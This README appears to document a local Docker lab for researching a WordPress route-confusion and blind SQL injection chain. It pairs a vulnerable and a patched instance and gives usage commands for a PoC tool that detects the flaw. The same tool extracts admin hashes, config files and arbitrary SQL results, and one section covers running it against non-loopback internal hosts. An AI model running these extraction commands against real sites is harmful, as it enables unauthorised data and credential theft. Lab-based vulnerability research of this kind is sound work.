# wp2shell Docker Lab

Isolated local laboratory for CVE-2026-63030 + CVE-2026-60137 research.

## Endpoints

| Container | URL | Version | Role |
|-----------|-----|---------|------|
| `wp2shell-vulnerable` | http://127.0.0.1:8081 | WordPress 7.0.1 | **Vulnerable** |
| `wp2shell-fixed` | http://127.0.0.1:8082 | WordPress 7.0.2 | **Patched** |
| `wp2shell-mysql-vulnerable` | 127.0.0.1:3307 | MySQL 8.0 | DB for vuln |
| `wp2shell-mysql-fixed` | 127.0.0.1:3308 | MySQL 8.0 | DB for fixed |

## Credentials (local lab only)

```
Admin user : admin
Password   : wp2shell-local-lab
MySQL root : wp2shell_root_local_only
MySQL user : wordpress / wp2shell_local_only
```

## Quick Start

```powershell
# Build & start everything
cd "D:\CVE Research\wp2shell\lab"
docker compose up -d

# Install WordPress on both instances
docker exec wp2shell-vulnerable wp --allow-root core install `
  --url="http://127.0.0.1:8081" --title="wp2shell Vuln 7.0.1" `
  --admin_user=admin --admin_password="wp2shell-local-lab" `
  --admin_email=admin@localhost.local --skip-email

docker exec wp2shell-fixed wp --allow-root core install `
  --url="http://127.0.0.1:8082" --title="wp2shell Fixed 7.0.2" `
  --admin_user=admin --admin_password="wp2shell-local-lab" `
  --admin_email=admin@localhost.local --skip-email

# Create .htaccess for pretty permalinks
docker exec wp2shell-vulnerable bash -c 'cat > /var/www/html/.htaccess << EOF
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
EOF
chown www-data:www-data /var/www/html/.htaccess'

docker exec wp2shell-fixed bash -c 'cat > /var/www/html/.htaccess << EOF
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
EOF
chown www-data:www-data /var/www/html/.htaccess && apache2ctl graceful'

# Create test posts
docker exec wp2shell-vulnerable wp --allow-root post create --post_title="Test Post 1" --post_content="Hello wp2shell" --post_status=publish
docker exec wp2shell-fixed wp --allow-root post create --post_title="Test Post 1" --post_content="Hello wp2shell" --post_status=publish
```

## Verify

```powershell
# Check versions
docker exec wp2shell-vulnerable wp --allow-root core version
docker exec wp2shell-fixed wp --allow-root core version

# Check REST API
curl "http://127.0.0.1:8081/index.php?rest_route=/wp/v2/posts&per_page=1"
curl "http://127.0.0.1:8082/index.php?rest_route=/wp/v2/posts&per_page=1"
```

## PoC Tool Usage

Tool is at `../poc/wp2shell.py`.

### Help

```bash
python3 ../poc/wp2shell.py -h
python3 ../poc/wp2shell.py scan -h
python3 ../poc/wp2shell.py read -h
```

### Scan for Vulnerability

```bash
# Vulnerable instance — should detect
python3 ../poc/wp2shell.py -t http://127.0.0.1:8081 scan --sleep 2

# Fixed instance — should report SAFE
python3 ../poc/wp2shell.py -t http://127.0.0.1:8082 scan --sleep 2

# Export results
python3 ../poc/wp2shell.py -t http://127.0.0.1:8081 -o scan-report.json scan
python3 ../poc/wp2shell.py -t http://127.0.0.1:8081 -o scan-report.csv scan
```

### Extract Data (read)

```bash
# Database fingerprint
python3 ../poc/wp2shell.py -t http://127.0.0.1:8081 read --preset fingerprint --sleep 2

# User credentials (admin hash)
python3 ../poc/wp2shell.py -t http://127.0.0.1:8081 read --preset users --sleep 2

# WordPress config
python3 ../poc/wp2shell.py -t http://127.0.0.1:8081 read --preset config --sleep 2

# Raw SQL query
python3 ../poc/wp2shell.py -t http://127.0.0.1:8081 read --query "SELECT VERSION()" --sleep 2

# Export to file
python3 ../poc/wp2shell.py -t http://127.0.0.1:8081 -o users.json read --preset users
python3 ../poc/wp2shell.py -t http://127.0.0.1:8081 -o users.csv read --preset users
```

### Scan Internal Sites

```bash
# Requires --force for non-loopback targets (AUTHORIZATION MANDATORY)
python3 ../poc/wp2shell.py -t https://internal.corp scan --force -o report.json
python3 ../poc/wp2shell.py -t https://internal.corp read --preset users --force -o users.csv
```

### Flags

| Flag | Description |
|------|-------------|
| `-t, --target` | WordPress base URL |
| `-o, --output` | Export results (`.json` / `.csv` / `.txt`) |
| `--sleep` | SLEEP seconds for time-based SQLi (default: 3) |
| `--rounds` | Timing sample rounds for scan (default: 3) |
| `--timeout` | HTTP timeout in seconds (default: 30) |
| `--proxy` | HTTP proxy (e.g. `http://127.0.0.1:8080`) |
| `--ua` | Custom User-Agent |
| `--force` | Allow non-loopback targets |
| `--no-banner` | Skip RGB glitch banner |

## Expected Results

### Vulnerable (7.0.1)

```
[*] WordPress 7.0.1 detected via HTML meta generator
[-] VERSION IN AFFECTED RANGE
[+] Route confusion CONFIRMED (codes: parse_path_failed, block_cannot_read, rest_batch_not_allowed)
[+] BLIND SQL INJECTION CONFIRMED (delta=2.0s >= threshold=1.3s)
[!!!] VULNERABLE — wp2shell chain confirmed
```

### Fixed (7.0.2)

```
[*] WordPress 7.0.2 detected via HTML meta generator
[+] Version 7.0.2 is not in affected range
[-] Route confusion NOT detected
[-] SQL injection NOT confirmed
[SAFE] Not vulnerable or could not confirm
```

## Management

```powershell
# Stop (preserve data)
docker compose stop

# Start again
docker compose start

# Full reset (delete all data)
docker compose down --volumes
docker volume rm wp2shell-mysql-vulnerable wp2shell-mysql-fixed 2>$null
docker network rm wp2shell-net 2>$null
```

## Files

```
lab/
├── Dockerfile              # PHP 8.2 + Apache + WP-CLI + WordPress
├── docker-compose.yml      # 2 WP instances + 2 MySQL + healthchecks
├── wp-config-vulnerable.php
├── wp-config-fixed.php
├── mysql-init.sql
├── php-overrides.ini
├── setup-wp.sh
├── .env.example
└── README.md               # This file
```
